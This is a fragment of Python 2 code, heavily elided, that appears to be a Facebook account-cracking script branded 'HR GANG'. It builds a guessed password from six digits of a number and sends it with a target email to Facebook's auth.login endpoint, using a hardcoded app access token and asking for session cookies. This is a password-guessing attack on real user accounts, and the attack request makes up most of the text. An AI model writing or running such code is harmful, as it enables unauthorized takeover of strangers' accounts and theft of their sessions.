...
def menu():
    ...
    print '\033[0;96mpage: It`s HR GANG'
    print ''
...
def action():
    ...
    time.sleep(0.5)
    psb('[\xe2\x9c\x96] Plz Wait Some Minit Idz faste showings...')
    time.sleep(0.5)
    ...
    def main(arg):
        ...
        try:
            ...
            digi6 = result[8:14]
            pass1 = digi6
            data = br.open('https://m.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
            q = json.load(data)
